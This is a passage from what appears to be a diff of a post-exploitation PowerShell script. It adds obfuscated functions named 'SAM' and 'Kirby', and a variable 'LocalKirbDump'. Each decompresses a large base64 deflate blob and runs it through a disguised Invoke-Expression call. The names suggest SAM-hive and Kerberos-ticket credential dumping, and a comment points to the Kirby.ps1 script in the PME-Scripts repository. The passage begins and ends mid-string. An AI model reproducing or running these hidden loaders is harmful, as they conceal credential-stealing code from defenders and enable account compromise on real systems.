Yh0ZJoS3QkugJNXaIl0ZboSGwItHSJlkRbYl1iQyBkuEBToi3RkegKhL0QaEm0EfFlWNHxaMoXEn2nNfLTZOZPU6wK+hCKkFwvs82TMpMPR144wbkYKxKDJlgZUT8pijCGFZNaBckoiBDPcgkW0tSEgCK7OaxYeQ2+b4R4nEtwVGY/5LeGFZv61LZ28SRnxRGOWbn5RXZ7WKmpjykXz6QA4wD4zUfdrw0rdcYKIrZl1DYyrAMVCvtDB+rDiqNKbnErGZwDGRXYCGghd6V2UHSBnho0ogpiQ3SCLfItemOb3qQG8DS5OcS/f2E/0CGk90UXKS0pGDcDgvccqY2kqngz0SFID0wuEtdyuXBdf560vjEB75xh6xnHHHKMKIuNLifBM7DUGP4pTV3FPM3ikA3mXjqD4ecgiDARlCV7u1k7jW6AxSQOeB/Bzo9zTMJavXafRh36a8yKvtGlYZIvx0E24ZN89EkYNdHSYcaTFL/LFJN5/m2oVvq92z78lPoBOJMvYuLBFMc98SaPGpkfMqkaLPenZbqp5lrwjz5++FC5il+YpvAyA+mAw/AWk7qbr8BApu563sQa2VZtVINeYXN+/35DjXNa9Sw6iuD9sKyqu7u7JZHUJ6SKRjf5Hzz+Dw==') , [SYsTem.io.cOmprESSiOn.cOMPResSioNmode]::decomPRess)) , [SYStEM.TexT.EncOdING]::ASciI) ).ReaDtoEnd() | . ( $EnV:comSpEC[4,15,25]-jOIn'')
+function SAM {( New-ObjECT  SyStem.Io.StreAMREAder((New-ObjECT sysTeM.iO.COMpresSIoN.DeFLAtestrEaM( [iO.MEmORYstREam][sYsTEM.CONveRt]::FRoMBASE64STRInG('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') , [SYsTem.io.cOmprESSiOn.cOMPResSioNmode]::decomPRess)) , [SYStEM.TexT.EncOdING]::ASciI) ).ReaDtoEnd() | . ( $EnV:comSpEC[4,15,25]-jOIn'')} ; SAM | Write-Output
 '@
 
 # Highly compressed revision of this script: https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1
 $Global:LocalKirbDump = @'
-( New-OBJecT Io.CompRessIon.dEflAteStreAm( [SySTEm.iO.MEmOrystReAm] [SYSTEM.COnVERT]::fRombaSE64sTRiNG( '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') , [io.COmprESSIoN.CompRESSiONmOde]::dECoMpREsS ) | FOrEacH{New-OBJecT  Io.STReAmrEAdeR($_, [TeXT.eNCoDInG]::aScII ) } | FoREach {$_.rEadToeND() }) |.((VaRIabLE '*Mdr*').nAMe[3,11,2]-joIN'')
+Function Kirby {( New-OBJecT Io.CompRessIon.dEflAteStreAm( [SySTEm.iO.MEmOrystReAm] [SYSTEM.COnVERT]::fRombaSE64sTRiNG( 'rTxrc9vGrt870/+wV5O5lhrZtRU3J6ea3Kks0bFqRVJEqm3q8Xhpam3zmCIVkoqto/K/XwC7Sy71cPxIz2kt7RPAAlgAC+h4HnqpH4WsG36NbsXuqR9fLpY//mCLdLcV+G7CwgHri7vdweV/hJeaHe5H1ppMdj+K6aWIzY67Afsz9lOxO5insznMebX8K2PsPWPVynI/Wx5kFbZ7tTObXwY79R3f22E1HJPwvhoF/4d/K8tGJocv32QVmODswfCf3FbDbcGHvrPXGsPfBkyv7cZiGLieYNUz78aNz//9L8Zey49vf4GPjMkvv+yzWl0NacCuVzn6LXv5ajnLYP/rGaDgh0F0De3sH8YSEQDqADI7YLvifsa6k6Z/hSC+Wt7gjDN/OksWyR7MetM4//XXwUyEwzjyRJLAoP37w/39+qtlykdzK6ufdcMURr1aDrMaY7Vd8QVbhmkME/8WcQRtAImVASHORvMw9adiDwZAz8wW8VcfVt376MbJjRvAjA8i7blJ+ifubMVxFMOGtQw2I7hKCzcZA6gZ2w2j9AGIHWCDkHA7yer79/tW/SwWVwCvQ/ACbIKO6QXATdaBY6yJ0G2CrTOfBb7npoIgs+6rDGFB0Br79E+9vBT14H8ONOSdjNVyqj4TbgA8jRfLrRTsTmciTqIQ4OxF19diMgjHiYirhG1N0e1lZ9pGsr2qntmLJBXTPVt4cxCzxd4w9kPPn7nBHkyZRHdJdyJgj3Qh12rP4xi+4yJ7fXcq4C/RGhfcnbqpdwMEtUn4astYpPM4RArHfGxlmQgSUTQe81ZgQ2vm4bSi/crlQQLtRQNv9Ti2/PjDsRaxXuKOxLUPsMc9lC0tIUiagM9CwI6kXos8iD/pCSTjGxT0fBZ8SeBfkewAyMA4sGFgA3FBVaW+dyvSvcl8Onvds1sXtjPq9j9cdPsw7NWyx1FeYZgioeSbpqboGL6/PTxHVWS1x7HPncU0muCx7TO1DbezvZ4Ir9MbkAFz3sHbc+wehkU/7QjjP7r3/nQ+3TaNZK1XmvkaNA1ihu1Jtnc5v7oSMcqMmvltHrJTYIprJzr5EESXbtAKE7+Kq83omAGXMz9MAeKYWw6xpUE4mL7trBQJtGAFN/